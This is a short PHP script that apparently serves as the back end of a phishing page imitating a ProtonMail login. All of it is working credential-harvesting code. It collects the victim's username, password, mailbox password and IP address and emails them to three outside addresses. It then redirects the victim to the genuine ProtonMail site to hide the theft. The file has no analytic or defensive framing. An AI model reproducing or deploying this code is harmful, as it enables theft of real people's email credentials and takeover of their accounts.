<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Proton GOD 1ST SON || :------\n";
$message .= "Proton ID              : ".$_POST['username']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "Password               : ".$_POST['mailbox-password']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="	Hackersworlds@protonmail.com,allianceraw.cassie@gmail.com,rit0zurichbox@yandex.com";
$subject = "Proton| ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: http://mail.protonmail.com");
?>